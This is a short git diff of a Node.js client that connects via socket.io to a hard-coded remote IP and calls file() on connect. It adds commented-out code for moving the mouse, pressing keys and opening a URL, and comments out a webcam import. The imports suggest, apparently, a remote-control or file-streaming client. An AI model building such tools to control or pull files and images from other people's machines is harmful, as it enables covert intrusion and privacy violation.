@@ -1,4 +1,4 @@
-const nodeWebCam = require('node-webcam');
+// const nodeWebCam = require('node-webcam');
 const fs = require('fs')
 
 const readline = require('readline')
@@ -9,6 +9,50 @@ const ss = require('socket.io-stream');
 const path = require('path');
 const glob = require('glob');
 const os = require('os');
+
+// file()
+
+// const {
+//     mouse,
+//     screen,
+//     singleWord,
+//     sleep,
+//     useConsoleLogger,
+//     ConsoleLogLevel,
+//     straightTo,
+//     centerOf,
+//     Button,
+//     getActiveWindow,
+//     right,
+//     left,
+//     up,
+//     down,
+//     keyboard,
+//     Key,
+//     Window,
+//     Point,
+//     Size,
+//     getWindows,
+// } = require("@nut-tree-fork/nut-js");
+
+// (async () => {
+//     await mouse.move(left(500));
+//     await mouse.move(up(500));
+//     await mouse.move(right(500));
+//     await mouse.move(down(500))
+//     await keyboard.pressKey(Key.AudioVolDown)
+
+//     // await keyboard.type('According to all known laws of physics')
+//     // await (await getActiveWindow()).resize(new Size(5, 5))
+//     await mouse.setPosition(new Point(0, 0))
+// })();
+
+
+// var url = 'http://localhost';
+// var start = (process.platform == 'darwin'? 'open': process.platform == 'win32'? 'start': 'xdg-open');
+// require('child_process').exec(start + ' ' + url);
+
+
 
 // const socket = io("http://159.89.120.211:3000");
 const socket = io("http://159.89.120.211:3000", {
@@ -34,7 +78,7 @@ socket.on("connect", () => {
         joined = true;
         
         file()
-        
+
     }
     else {
         socket.emit("rejoin", name, img)
